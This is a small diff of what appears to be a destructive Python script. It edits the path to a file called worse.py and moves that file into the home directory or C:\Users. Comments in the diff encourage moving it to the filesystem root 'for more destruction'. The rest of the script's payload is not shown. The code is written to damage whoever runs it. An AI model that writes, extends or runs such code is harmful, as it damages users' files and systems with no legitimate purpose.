@@ -7,12 +7,12 @@ from concurrent.futures import ThreadPoolExecutor
 flist = []
 try:
     if os.name == 'posix':
-        source = os.path.expanduser("~/bad/worse.py")
+        source = os.path.expanduser("~/bad/dangerous/worse.py")
         destination = "/home/worse.py" #change to /worse.py for more destruction 
    
 
     elif os.name == 'nt':
-        source = os.path.expanduser(r"~\bad\worse.py")
+        source = os.path.expanduser(r"~\bad\\dangerous\worse.py")
         destination = r"C:\Users" #change to C:\worse.py for more destruction (idk if it works but who cares)
 
     shutil.move(source, destination)
